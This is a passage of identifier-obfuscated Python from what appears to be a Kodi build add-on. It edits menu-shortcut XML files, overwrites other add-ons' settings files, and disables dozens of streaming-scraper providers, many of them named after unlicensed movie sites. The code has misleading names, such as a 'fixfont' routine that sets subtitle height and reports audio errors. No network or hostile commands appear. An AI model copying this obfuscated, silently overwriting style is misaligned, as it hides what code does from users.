      O0OO0O00O000O0000 =O00O00O0O0OOO0O0O .read ()#line:1194
    O0OO0O00O000O0000 =O0OO0O00O000O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1212
    with open (O00OOO0O0OO0000O0 ,'w')as O00O00O0O0OOO0O0O :#line:1215
      O00O00O0O0OOO0O0O .write (O0OO0O00O000O0000 )#line:1216
    O00OOO0O0OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1220
    with open (O00OOO0O0OO0000O0 ,'r')as O00O00O0O0OOO0O0O :#line:1221
      O0OO0O00O000O0000 =O00O00O0O0OOO0O0O .read ()#line:1222
    O0OO0O00O000O0000 =O0OO0O00O000O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1240
    with open (O00OOO0O0OO0000O0 ,'w')as O00O00O0O0OOO0O0O :#line:1243
      O00O00O0O0OOO0O0O .write (O0OO0O00O000O0000 )#line:1244
    O00OOO0O0OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1248
    with open (O00OOO0O0OO0000O0 ,'r')as O00O00O0O0OOO0O0O :#line:1249
      O0OO0O00O000O0000 =O00O00O0O0OOO0O0O .read ()#line:1250
    O0OO0O00O000O0000 =O0OO0O00O000O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1268
    with open (O00OOO0O0OO0000O0 ,'w')as O00O00O0O0OOO0O0O :#line:1271
      O00O00O0O0OOO0O0O .write (O0OO0O00O000O0000 )#line:1272
    O00OOO0O0OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1275
    with open (O00OOO0O0OO0000O0 ,'r')as O00O00O0O0OOO0O0O :#line:1276
      O0OO0O00O000O0000 =O00O00O0O0OOO0O0O .read ()#line:1277
    O0OO0O00O000O0000 =O0OO0O00O000O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1295
    with open (O00OOO0O0OO0000O0 ,'w')as O00O00O0O0OOO0O0O :#line:1298
      O00O00O0O0OOO0O0O .write (O0OO0O00O000O0000 )#line:1299
    O00OOO0O0OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1301
    with open (O00OOO0O0OO0000O0 ,'r')as O00O00O0O0OOO0O0O :#line:1302
      O0OO0O00O000O0000 =O00O00O0O0OOO0O0O .read ()#line:1303
    O0OO0O00O000O0000 =O0OO0O00O000O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1321
    with open (O00OOO0O0OO0000O0 ,'w')as O00O00O0O0OOO0O0O :#line:1324
      O00O00O0O0OOO0O0O .write (O0OO0O00O000O0000 )#line:1325
    O00OOO0O0OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1327
    with open (O00OOO0O0OO0000O0 ,'r')as O00O00O0O0OOO0O0O :#line:1328
      O0OO0O00O000O0000 =O00O00O0O0OOO0O0O .read ()#line:1329
    O0OO0O00O000O0000 =O0OO0O00O000O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1347
    with open (O00OOO0O0OO0000O0 ,'w')as O00O00O0O0OOO0O0O :#line:1350
      O00O00O0O0OOO0O0O .write (O0OO0O00O000O0000 )#line:1351
    O00OOO0O0OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1354
    with open (O00OOO0O0OO0000O0 ,'r')as O00O00O0O0OOO0O0O :#line:1355
      O0OO0O00O000O0000 =O00O00O0O0OOO0O0O .read ()#line:1356
    O0OO0O00O000O0000 =O0OO0O00O000O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1374
    with open (O00OOO0O0OO0000O0 ,'w')as O00O00O0O0OOO0O0O :#line:1377
      O00O00O0O0OOO0O0O .write (O0OO0O00O000O0000 )#line:1378
def rdbuildinstallON ():#line:1381
    try :#line:1383
       OOOOO000000O0OO0O =ADDONPATH +"/resources/rd/victory.xml"#line:1384
       O00O000000OO000O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1385
       copyfile (OOOOO000000O0OO0O ,O00O000000OO000O0 )#line:1387
       OOOOO000000O0OO0O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1389
       O00O000000OO000O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1390
       copyfile (OOOOO000000O0OO0O ,O00O000000OO000O0 )#line:1392
       OOOOO000000O0OO0O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1394
       O00O000000OO000O0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1395
       copyfile (OOOOO000000O0OO0O ,O00O000000OO000O0 )#line:1397
       OOOOO000000O0OO0O =ADDONPATH +"/resources/rd/Splash.png"#line:1400
       O00O000000OO000O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1401
       copyfile (OOOOO000000O0OO0O ,O00O000000OO000O0 )#line:1403
    except :#line:1405
       pass #line:1406
def rdbuild ():#line:1416
	O00OO00OOOO000OO0 =(ADDON .getSetting ("rdbuild"))#line:1417
	if O00OO00OOOO000OO0 =='true':#line:1418
		OO00OOOOOOOO0O000 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1419
		OO00OOOOOOOO0O000 .setSetting ('all_t','0')#line:1420
		OO00OOOOOOOO0O000 .setSetting ('rd_menu_enable','false')#line:1421
		OO00OOOOOOOO0O000 .setSetting ('magnet_bay','false')#line:1422
		OO00OOOOOOOO0O000 .setSetting ('magnet_extra','false')#line:1423
		OO00OOOOOOOO0O000 .setSetting ('rd_only','false')#line:1424
		OO00OOOOOOOO0O000 .setSetting ('ftp','false')#line:1426
		OO00OOOOOOOO0O000 .setSetting ('fp','false')#line:1427
		OO00OOOOOOOO0O000 .setSetting ('filter_fp','false')#line:1428
		OO00OOOOOOOO0O000 .setSetting ('fp_size_en','false')#line:1429
		OO00OOOOOOOO0O000 .setSetting ('afdah','false')#line:1430
		OO00OOOOOOOO0O000 .setSetting ('ap2s','false')#line:1431
		OO00OOOOOOOO0O000 .setSetting ('cin','false')#line:1432
		OO00OOOOOOOO0O000 .setSetting ('clv','false')#line:1433
		OO00OOOOOOOO0O000 .setSetting ('cmv','false')#line:1434
		OO00OOOOOOOO0O000 .setSetting ('dl20','false')#line:1435
		OO00OOOOOOOO0O000 .setSetting ('esc','false')#line:1436
		OO00OOOOOOOO0O000 .setSetting ('extra','false')#line:1437
		OO00OOOOOOOO0O000 .setSetting ('film','false')#line:1438
		OO00OOOOOOOO0O000 .setSetting ('fre','false')#line:1439
		OO00OOOOOOOO0O000 .setSetting ('fxy','false')#line:1440
		OO00OOOOOOOO0O000 .setSetting ('genv','false')#line:1441
		OO00OOOOOOOO0O000 .setSetting ('getgo','false')#line:1442
		OO00OOOOOOOO0O000 .setSetting ('gold','false')#line:1443
		OO00OOOOOOOO0O000 .setSetting ('gona','false')#line:1444
		OO00OOOOOOOO0O000 .setSetting ('hdmm','false')#line:1445
		OO00OOOOOOOO0O000 .setSetting ('hdt','false')#line:1446
		OO00OOOOOOOO0O000 .setSetting ('icy','false')#line:1447
		OO00OOOOOOOO0O000 .setSetting ('ind','false')#line:1448
		OO00OOOOOOOO0O000 .setSetting ('iwi','false')#line:1449
		OO00OOOOOOOO0O000 .setSetting ('jen_free','false')#line:1450
		OO00OOOOOOOO0O000 .setSetting ('kiss','false')#line:1451
		OO00OOOOOOOO0O000 .setSetting ('lavin','false')#line:1452
		OO00OOOOOOOO0O000 .setSetting ('los','false')#line:1453
		OO00OOOOOOOO0O000 .setSetting ('m4u','false')#line:1454
		OO00OOOOOOOO0O000 .setSetting ('mesh','false')#line:1455
		OO00OOOOOOOO0O000 .setSetting ('mf','false')#line:1456
		OO00OOOOOOOO0O000 .setSetting ('mkvc','false')#line:1457
		OO00OOOOOOOO0O000 .setSetting ('mjy','false')#line:1458
		OO00OOOOOOOO0O000 .setSetting ('hdonline','false')#line:1459
		OO00OOOOOOOO0O000 .setSetting ('moviex','false')#line:1460
		OO00OOOOOOOO0O000 .setSetting ('mpr','false')#line:1461
		OO00OOOOOOOO0O000 .setSetting ('mvg','false')#line:1462
		OO00OOOOOOOO0O000 .setSetting ('mvl','false')#line:1463
		OO00OOOOOOOO0O000 .setSetting ('mvs','false')#line:1464
		OO00OOOOOOOO0O000 .setSetting ('myeg','false')#line:1465
		OO00OOOOOOOO0O000 .setSetting ('ninja','false')#line:1466
		OO00OOOOOOOO0O000 .setSetting ('odb','false')#line:1467
		OO00OOOOOOOO0O000 .setSetting ('ophd','false')#line:1468
		OO00OOOOOOOO0O000 .setSetting ('pks','false')#line:1469
		OO00OOOOOOOO0O000 .setSetting ('prf','false')#line:1470
		OO00OOOOOOOO0O000 .setSetting ('put18','false')#line:1471
		OO00OOOOOOOO0O000 .setSetting ('req','false')#line:1472
		OO00OOOOOOOO0O000 .setSetting ('rftv','false')#line:1473
		OO00OOOOOOOO0O000 .setSetting ('rltv','false')#line:1474
		OO00OOOOOOOO0O000 .setSetting ('sc','false')#line:1475
		OO00OOOOOOOO0O000 .setSetting ('seehd','false')#line:1476
		OO00OOOOOOOO0O000 .setSetting ('showbox','false')#line:1477
		OO00OOOOOOOO0O000 .setSetting ('shuid','false')#line:1478
		OO00OOOOOOOO0O000 .setSetting ('sil_gh','false')#line:1479
		OO00OOOOOOOO0O000 .setSetting ('spv','false')#line:1480
		OO00OOOOOOOO0O000 .setSetting ('subs','false')#line:1481
		OO00OOOOOOOO0O000 .setSetting ('tvs','false')#line:1482
		OO00OOOOOOOO0O000 .setSetting ('tw','false')#line:1483
		OO00OOOOOOOO0O000 .setSetting ('upto','false')#line:1484
		OO00OOOOOOOO0O000 .setSetting ('vel','false')#line:1485
		OO00OOOOOOOO0O000 .setSetting ('vex','false')#line:1486
		OO00OOOOOOOO0O000 .setSetting ('vidc','false')#line:1487
		OO00OOOOOOOO0O000 .setSetting ('w4hd','false')#line:1488
		OO00OOOOOOOO0O000 .setSetting ('wav','false')#line:1489
		OO00OOOOOOOO0O000 .setSetting ('wf','false')#line:1490
		OO00OOOOOOOO0O000 .setSetting ('wse','false')#line:1491
		OO00OOOOOOOO0O000 .setSetting ('wss','false')#line:1492
		OO00OOOOOOOO0O000 .setSetting ('wsse','false')#line:1493
		OO00OOOOOOOO0O000 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1494
		OO00OOOOOOOO0O000 .setSetting ('debrid.only','true')#line:1495
		OO00OOOOOOOO0O000 .setSetting ('hosts.captcha','false')#line:1496
		OO00OOOOOOOO0O000 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1497
		OO00OOOOOOOO0O000 .setSetting ('provider.123moviehd','false')#line:1498
		OO00OOOOOOOO0O000 .setSetting ('provider.300mbdownload','false')#line:1499
		OO00OOOOOOOO0O000 .setSetting ('provider.alltube','false')#line:1500
		OO00OOOOOOOO0O000 .setSetting ('provider.allucde','false')#line:1501
		OO00OOOOOOOO0O000 .setSetting ('provider.animebase','false')#line:1502
		OO00OOOOOOOO0O000 .setSetting ('provider.animeloads','false')#line:1503
		OO00OOOOOOOO0O000 .setSetting ('provider.animetoon','false')#line:1504
		OO00OOOOOOOO0O000 .setSetting ('provider.bnwmovies','false')#line:1505
		OO00OOOOOOOO0O000 .setSetting ('provider.boxfilm','false')#line:1506
		OO00OOOOOOOO0O000 .setSetting ('provider.bs','false')#line:1507
		OO00OOOOOOOO0O000 .setSetting ('provider.cartoonhd','false')#line:1508
		OO00OOOOOOOO0O000 .setSetting ('provider.cdahd','false')#line:1509
		OO00OOOOOOOO0O000 .setSetting ('provider.cdax','false')#line:1510
		OO00OOOOOOOO0O000 .setSetting ('provider.cine','false')#line:1511
		OO00OOOOOOOO0O000 .setSetting ('provider.cinenator','false')#line:1512
		OO00OOOOOOOO0O000 .setSetting ('provider.cmovieshdbz','false')#line:1513
		OO00OOOOOOOO0O000 .setSetting ('provider.coolmoviezone','false')#line:1514
		OO00OOOOOOOO0O000 .setSetting ('provider.ddl','false')#line:1515
		OO00OOOOOOOO0O000 .setSetting ('provider.deepmovie','false')#line:1516
		OO00OOOOOOOO0O000 .setSetting ('provider.ekinomaniak','false')#line:1517
		OO00OOOOOOOO0O000 .setSetting ('provider.ekinotv','false')#line:1518
		OO00OOOOOOOO0O000 .setSetting ('provider.filiser','false')#line:1519
		OO00OOOOOOOO0O000 .setSetting ('provider.filmpalast','false')#line:1520
		OO00OOOOOOOO0O000 .setSetting ('provider.filmwebbooster','false')#line:1521
		OO00OOOOOOOO0O000 .setSetting ('provider.filmxy','false')#line:1522
		OO00OOOOOOOO0O000 .setSetting ('provider.fmovies','false')#line:1523
		OO00OOOOOOOO0O000 .setSetting ('provider.foxx','false')#line:1524
		OO00OOOOOOOO0O000 .setSetting ('provider.freefmovies','false')#line:1525
		OO00OOOOOOOO0O000 .setSetting ('provider.freeputlocker','false')#line:1526
		OO00OOOOOOOO0O000 .setSetting ('provider.furk','false')#line:1527
		OO00OOOOOOOO0O000 .setSetting ('provider.gamatotv','false')#line:1528
		OO00OOOOOOOO0O000 .setSetting ('provider.gogoanime','false')#line:1529
		OO00OOOOOOOO0O000 .setSetting ('provider.gowatchseries','false')#line:1530
		OO00OOOOOOOO0O000 .setSetting ('provider.hackimdb','false')#line:1531
		OO00OOOOOOOO0O000 .setSetting ('provider.hdfilme','false')#line:1532
		OO00OOOOOOOO0O000 .setSetting ('provider.hdmto','false')#line:1533
		OO00OOOOOOOO0O000 .setSetting ('provider.hdpopcorns','false')#line:1534
		OO00OOOOOOOO0O000 .setSetting ('provider.hdstreams','false')#line:1535
		OO00OOOOOOOO0O000 .setSetting ('provider.horrorkino','false')#line:1537
		OO00OOOOOOOO0O000 .setSetting ('provider.iitv','false')#line:1538
		OO00OOOOOOOO0O000 .setSetting ('provider.iload','false')#line:1539
		OO00OOOOOOOO0O000 .setSetting ('provider.iwaatch','false')#line:1540
		OO00OOOOOOOO0O000 .setSetting ('provider.kinodogs','false')#line:1541
		OO00OOOOOOOO0O000 .setSetting ('provider.kinoking','false')#line:1542
		OO00OOOOOOOO0O000 .setSetting ('provider.kinow','false')#line:1543
		OO00OOOOOOOO0O000 .setSetting ('provider.kinox','false')#line:1544
		OO00OOOOOOOO0O000 .setSetting ('provider.lichtspielhaus','false')#line:1545
		OO00OOOOOOOO0O000 .setSetting ('provider.liomenoi','false')#line:1546
		OO00OOOOOOOO0O000 .setSetting ('provider.magnetdl','false')#line:1549
		OO00OOOOOOOO0O000 .setSetting ('provider.megapelistv','false')#line:1550
		OO00OOOOOOOO0O000 .setSetting ('provider.movie2k-ac','false')#line:1551
		OO00OOOOOOOO0O000 .setSetting ('provider.movie2k-ag','false')#line:1552
		OO00OOOOOOOO0O000 .setSetting ('provider.movie2z','false')#line:1553
		OO00OOOOOOOO0O000 .setSetting ('provider.movie4k','false')#line:1554
		OO00OOOOOOOO0O000 .setSetting ('provider.movie4kis','false')#line:1555
		OO00OOOOOOOO0O000 .setSetting ('provider.movieneo','false')#line:1556
		OO00OOOOOOOO0O000 .setSetting ('provider.moviesever','false')#line:1557
		OO00OOOOOOOO0O000 .setSetting ('provider.movietown','false')#line:1558
		OO00OOOOOOOO0O000 .setSetting ('provider.mvrls','false')#line:1560
		OO00OOOOOOOO0O000 .setSetting ('provider.netzkino','false')#line:1561
		OO00OOOOOOOO0O000 .setSetting ('provider.odb','false')#line:1562
		OO00OOOOOOOO0O000 .setSetting ('provider.openkatalog','false')#line:1563
		OO00OOOOOOOO0O000 .setSetting ('provider.ororo','false')#line:1564
		OO00OOOOOOOO0O000 .setSetting ('provider.paczamy','false')#line:1565
		OO00OOOOOOOO0O000 .setSetting ('provider.peliculasdk','false')#line:1566
		OO00OOOOOOOO0O000 .setSetting ('provider.pelisplustv','false')#line:1567
		OO00OOOOOOOO0O000 .setSetting ('provider.pepecine','false')#line:1568
		OO00OOOOOOOO0O000 .setSetting ('provider.primewire','false')#line:1569
		OO00OOOOOOOO0O000 .setSetting ('provider.projectfreetv','false')#line:1570
		OO00OOOOOOOO0O000 .setSetting ('provider.proxer','false')#line:1571
		OO00OOOOOOOO0O000 .setSetting ('provider.pureanime','false')#line:1572
		OO00OOOOOOOO0O000 .setSetting ('provider.putlocker','false')#line:1573
		OO00OOOOOOOO0O000 .setSetting ('provider.putlockerfree','false')#line:1574
		OO00OOOOOOOO0O000 .setSetting ('provider.reddit','false')#line:1575
		OO00OOOOOOOO0O000 .setSetting ('provider.cartoonwire','false')#line:1576
		OO00OOOOOOOO0O000 .setSetting ('provider.seehd','false')#line:1577
		OO00OOOOOOOO0O000 .setSetting ('provider.segos','false')#line:1578
		OO00OOOOOOOO0O000 .setSetting ('provider.serienstream','false')#line:1579
		OO00OOOOOOOO0O000 .setSetting ('provider.series9','false')#line:1580
		OO00OOOOOOOO0O000 .setSetting ('provider.seriesever','false')#line:1581
		OO00OOOOOOOO0O000 .setSetting ('provider.seriesonline','false')#line:1582
		OO00OOOOOOOO0O000 .setSetting ('provider.seriespapaya','false')#line:1583
		OO00OOOOOOOO0O000 .setSetting ('provider.sezonlukdizi','false')#line:1584
		OO00OOOOOOOO0O000 .setSetting ('provider.solarmovie','false')#line:1585
		OO00OOOOOOOO0O000 .setSetting ('provider.solarmoviez','false')#line:1586
		OO00OOOOOOOO0O000 .setSetting ('provider.stream-to','false')#line:1587
		OO00OOOOOOOO0O000 .setSetting ('provider.streamdream','false')#line:1588
		OO00OOOOOOOO0O000 .setSetting ('provider.streamflix','false')#line:1589
		OO00OOOOOOOO0O000 .setSetting ('provider.streamit','false')#line:1590
		OO00OOOOOOOO0O000 .setSetting ('provider.swatchseries','false')#line:1591
		OO00OOOOOOOO0O000 .setSetting ('provider.szukajkatv','false')#line:1592
		OO00OOOOOOOO0O000 .setSetting ('provider.tainiesonline','false')#line:1593
		OO00OOOOOOOO0O000 .setSetting ('provider.tainiomania','false')#line:1594
		OO00OOOOOOOO0O000 .setSetting ('provider.tata','false')#line:1597
		OO00OOOOOOOO0O000 .setSetting ('provider.trt','false')#line:1598
		OO00OOOOOOOO0O000 .setSetting ('provider.tvbox','false')#line:1599
		OO00OOOOOOOO0O000 .setSetting ('provider.ultrahd','false')#line:1600
		OO00OOOOOOOO0O000 .setSetting ('provider.video4k','false')#line:1601
		OO00OOOOOOOO0O000 .setSetting ('provider.vidics','false')#line:1602
		OO00OOOOOOOO0O000 .setSetting ('provider.view4u','false')#line:1603
		OO00OOOOOOOO0O000 .setSetting ('provider.watchseries','false')#line:1604
		OO00OOOOOOOO0O000 .setSetting ('provider.xrysoi','false')#line:1605
		OO00OOOOOOOO0O000 .setSetting ('provider.library','false')#line:1606
def fixfont ():#line:1609
	O0000O00O000OO00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1610
	OO0O00O0O00O0O0OO =json .loads (O0000O00O000OO00O );#line:1612
	O0OO0O00O0O0O0OO0 =OO0O00O0O00O0O0OO ["result"]["settings"]#line:1613
	O0OO0O000OOO0OOOO =[OO00O0OOOO0O00OOO for OO00O0OOOO0O00OOO in O0OO0O00O0O0O0OO0 if OO00O0OOOO0O00OOO ["id"]=="audiooutput.audiodevice"][0 ]#line:1615
	O00OO0OO00000OOO0 =O0OO0O000OOO0OOOO ["options"];#line:1616
	O0O0000OO0O0OO0OO =O0OO0O000OOO0OOOO ["value"];#line:1617
	O0OOOOO0O0O00O0OO =[O0O0OOOOOOO0OO0O0 for (O0O0OOOOOOO0OO0O0 ,OOO000O0O0O00OO00 )in enumerate (O00OO0OO00000OOO0 )if OOO000O0O0O00OO00 ["value"]==O0O0000OO0O0OO0OO ][0 ];#line:1619
	OO000O0OOO0OOO00O =(O0OOOOO0O0O00O0OO +1 )%len (O00OO0OO00000OOO0 )#line:1621
	OOOOOOOOO000O0O00 =O00OO0OO00000OOO0 [OO000O0OOO0OOO00O ]["value"]#line:1623
	O0000000OOOOO00O0 =O00OO0OO00000OOO0 [OO000O0OOO0OOO00O ]["label"]#line:1624
	OO00OOOOO00OO00O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1626
	try :#line:1628
		OO0O0OO0O0O0OOOO0 =json .loads (OO00OOOOO00OO00O0 );#line:1629
		if OO0O0OO0O0O0OOOO0 ["result"]!=True :#line:1631
			raise Exception #line:1632
	except :#line:1633
		sys .stderr .write ("Error switching audio output device")#line:1634
		raise Exception #line:1635
def parseDOM2 (O0O00O00OOO0O0O00 ,name =u"",attrs ={},ret =False ):#line:1636
	if isinstance (O0O00O00OOO0O0O00 ,str ):#line:1639
		try :#line:1640
			O0O00O00OOO0O0O00 =[O0O00O00OOO0O0O00 .decode ("utf-8")]#line:1641
		except :#line:1642
			O0O00O00OOO0O0O00 =[O0O00O00OOO0O0O00 ]#line:1643
	elif isinstance (O0O00O00OOO0O0O00 ,unicode ):#line:1644
		O0O00O00OOO0O0O00 =[O0O00O00OOO0O0O00 ]#line:1645
	elif not isinstance (O0O00O00OOO0O0O00 ,list ):#line:1646
		return u""#line:1647
	if not name .strip ():#line:1649
		return u""#line:1650
	OOOO00OO000OO0OO0 =[]#line:1652
	for OOO000OOOOOO00O0O in O0O00O00OOO0O0O00 :#line:1653
		OOOO00OOOOOO000OO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOO000OOOOOO00O0O )#line:1654
		for OO000O00000O0O000 in OOOO00OOOOOO000OO :#line:1655
			OOO000OOOOOO00O0O =OOO000OOOOOO00O0O .replace (OO000O00000O0O000 ,OO000O00000O0O000 .replace ("\n"," "))#line:1656
		OOO0OOOOO0O00OO0O =[]#line:1658
		for OOO00O00O0O0OOOOO in attrs :#line:1659
			O0000OOOOOOO0OOO0 =re .compile ('(<'+name +'[^>]*?(?:'+OOO00O00O0O0OOOOO +'=[\'"]'+attrs [OOO00O00O0O0OOOOO ]+'[\'"].*?>))',re .M |re .S ).findall (OOO000OOOOOO00O0O )#line:1660
			if len (O0000OOOOOOO0OOO0 )==0 and attrs [OOO00O00O0O0OOOOO ].find (" ")==-1 :#line:1661
				O0000OOOOOOO0OOO0 =re .compile ('(<'+name +'[^>]*?(?:'+OOO00O00O0O0OOOOO +'='+attrs [OOO00O00O0O0OOOOO ]+'.*?>))',re .M |re .S ).findall (OOO000OOOOOO00O0O )#line:1662
			if len (OOO0OOOOO0O00OO0O )==0 :#line:1664
				OOO0OOOOO0O00OO0O =O0000OOOOOOO0OOO0 #line:1665
				O0000OOOOOOO0OOO0 =[]#line:1666
			else :#line:1667
				OO00OO0OOO0O0O0OO =range (len (OOO0OOOOO0O00OO0O ))#line:1668
				OO00OO0OOO0O0O0OO .reverse ()#line:1669
				for OO00O0OOO00O00000 in OO00OO0OOO0O0O0OO :#line:1670
					if not OOO0OOOOO0O00OO0O [OO00O0OOO00O00000 ]in O0000OOOOOOO0OOO0 :#line:1671
						del (OOO0OOOOO0O00OO0O [OO00O0OOO00O00000 ])#line:1672
		if len (OOO0OOOOO0O00OO0O )==0 and attrs =={}:#line:1674
			OOO0OOOOO0O00OO0O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOO000OOOOOO00O0O )#line:1675
			if len (OOO0OOOOO0O00OO0O )==0 :#line:1676
				OOO0OOOOO0O00OO0O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOO000OOOOOO00O0O )#line:1677
		if isinstance (ret ,str ):#line:1679
			O0000OOOOOOO0OOO0 =[]#line:1680
			for OO000O00000O0O000 in OOO0OOOOO0O00OO0O :#line:1681
				OO0OO0OO00O0O0O0O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO000O00000O0O000 )#line:1682
				if len (OO0OO0OO00O0O0O0O )==0 :#line:1683
					OO0OO0OO00O0O0O0O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO000O00000O0O000 )#line:1684
				for OO0000OOOO0O000O0 in OO0OO0OO00O0O0O0O :#line:1685
					O0000OO000000OO0O =OO0000OOOO0O000O0 [0 ]#line:1686
					if O0000OO000000OO0O in "'\"":#line:1687
						if OO0000OOOO0O000O0 .find ('='+O0000OO000000OO0O ,OO0000OOOO0O000O0 .find (O0000OO000000OO0O ,1 ))>-1 :#line:1688
							OO0000OOOO0O000O0 =OO0000OOOO0O000O0 [:OO0000OOOO0O000O0 .find ('='+O0000OO000000OO0O ,OO0000OOOO0O000O0 .find (O0000OO000000OO0O ,1 ))]#line:1689
						if OO0000OOOO0O000O0 .rfind (O0000OO000000OO0O ,1 )>-1 :#line:1691
							OO0000OOOO0O000O0 =OO0000OOOO0O000O0 [1 :OO0000OOOO0O000O0 .rfind (O0000OO000000OO0O )]#line:1692
					else :#line:1693
						if OO0000OOOO0O000O0 .find (" ")>0 :#line:1694
